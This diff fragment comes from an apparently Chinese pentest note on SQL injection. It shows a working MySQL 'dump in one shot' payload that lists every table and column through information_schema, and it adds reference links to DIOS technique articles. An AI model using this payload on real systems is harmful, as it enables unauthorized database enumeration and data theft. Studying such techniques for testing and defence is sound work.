@@ -46,3 +46,9 @@
 (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(table_schema='anyisec')and(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a);
 ```
 ![image](./3.png)  
+
+参考链接：  
+http://blog.dreamfever.me/2016/04/20/dump-in-one-shot/  
+http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html  
+http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html  
+http://securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html
